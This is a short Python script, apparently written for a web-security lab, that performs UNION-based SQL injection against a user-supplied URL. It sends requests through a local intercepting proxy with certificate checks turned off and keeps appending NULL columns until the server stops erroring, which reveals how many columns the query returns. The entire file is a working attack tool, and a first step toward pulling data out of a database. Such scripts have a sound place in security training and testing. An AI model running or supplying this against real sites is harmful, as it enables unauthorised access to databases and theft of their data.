import requests
import urllib3
import sys


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def exploit_sqli(url):
    counter = 1
    payload = "NULL"
    end = "--"
    r = requests.get(url + "' UNION SELECT " + payload + end, verify=False, proxies=proxies)
    while "Internal Server Error" in r.text:
        payload += ",NULL"
        r = requests.get(url+ "' UNION SELECT " + payload + end, verify=False, proxies=proxies)
        counter += 1
    return counter
    

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    numCols = exploit_sqli(url)
    print(f'(+) Number of returned columns: {numCols}')
    
    

if __name__ == "__main__":
    main()
